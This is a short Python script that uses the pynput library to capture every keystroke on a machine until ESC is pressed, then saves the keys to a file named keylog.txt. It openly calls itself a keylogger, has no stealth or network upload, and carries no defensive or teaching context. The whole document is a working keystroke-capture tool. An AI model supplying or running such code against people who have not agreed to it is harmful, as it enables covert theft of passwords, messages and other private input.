from pynput import keyboard
logged_keys = []

def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        logged_keys.append(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener by returning False
        return False


print("Keylogger started. Press ESC to stop and save logs.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    # Writing logged keys to a file
with open("keylog.txt", "w") as f:
    f.write(''.join(logged_keys))

print(f"Logs saved to keylog.txt")